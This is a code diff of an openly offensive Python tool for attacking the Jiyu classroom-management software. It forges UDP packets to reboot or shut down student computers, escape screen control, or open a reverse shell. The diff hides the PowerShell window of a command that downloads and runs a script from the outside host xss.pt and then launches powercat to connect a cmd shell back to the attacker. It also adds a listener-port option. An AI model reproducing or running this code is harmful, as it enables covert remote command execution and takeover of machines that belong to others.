@@ -29,7 +29,6 @@ header = """
     ------------------- Github Repositories -------------------
                         详细说明请看项目文档
             https://github.com/ht0Ruial/Jiyu_udp_attack
-
 """
 parser = argparse.ArgumentParser(header)
 parser.add_argument('-ip', type=str, help="ip 指定目标IP地址")
@@ -41,13 +40,13 @@ parser.add_argument(
 parser.add_argument('-l', type=int, default=1, help="循环次数，默认为1")
 parser.add_argument('-t', type=int, default=22, help="循环时间间隔，默认是22秒")
 
-parser.add_argument('-e', type=str, choices=['r', 's', 'g', 'nc', 'break', 'continue'], help="Extra Options加载额外的选项 eg：-e r"
-                    )
+parser.add_argument('-e', type=str, choices=['r', 's', 'g', 'nc', 'break', 'continue'], help="Extra Options加载额外的选项 eg：-e r")
 subparsers = parser.add_subparsers(help='-e 参数的详细说明')
 subparsers.add_parser('r', help='reboot 重启')
 subparsers.add_parser('s', help='shutdown 关机')
 subparsers.add_parser('g', help='独立选项，获取当前的ip地址以及学生端监听的端口')
 subparsers.add_parser('nc', help='独立选项，反弹shell的机器需出网，退出可使用命令exit')
+parser.add_argument('-port', type=int, default=8888, help="nc命令的监听端口")
 subparsers.add_parser('break', help='独立选项，脱离屏幕控制，需要管理员权限')
 subparsers.add_parser('continue', help='独立选项，恢复屏幕控制')
 args = parser.parse_args()
@@ -117,6 +116,7 @@ def pkg_sendlist(cmdtype, content):
         for elem in arrs:
             result[index] = elem
             index += 1
+    result[12] = random.randint(0,0xff)
     return result
 
 
@@ -198,7 +198,7 @@ def netcat(num):
     send_list = []
     hostname = socket.gethostname()
     ip = socket.gethostbyname(hostname)
-    cmd = "powershell IEX (New-Object System.Net.Webclient).DownloadString('https://xss.pt/hYvg');powercat -c {} -p {} -e cmd".format(ip, num)
+    cmd = "powershell -WindowStyle Hidden IEX (New-Object System.Net.Webclient).DownloadString('https://xss.pt/hYvg');powercat -c {} -p {} -e cmd".format(ip, num)
     send_list.append(pkg_sendlist('-c', cmd))
     send(send_list)
 
@@ -210,7 +210,9 @@ def run_from_cmd():
             send_list = creat_send_object()
             send(send_list)
             sys.exit(0)
-        num = random.randint(1, 65535)
+        # num = random.randint(1, 65535)
+        print(args)
+        num = args.port
         pool = Pool(processes=1)
         pool.apply_async(netcat, (num,))
         print("listening on [any] {} ...".format(num))
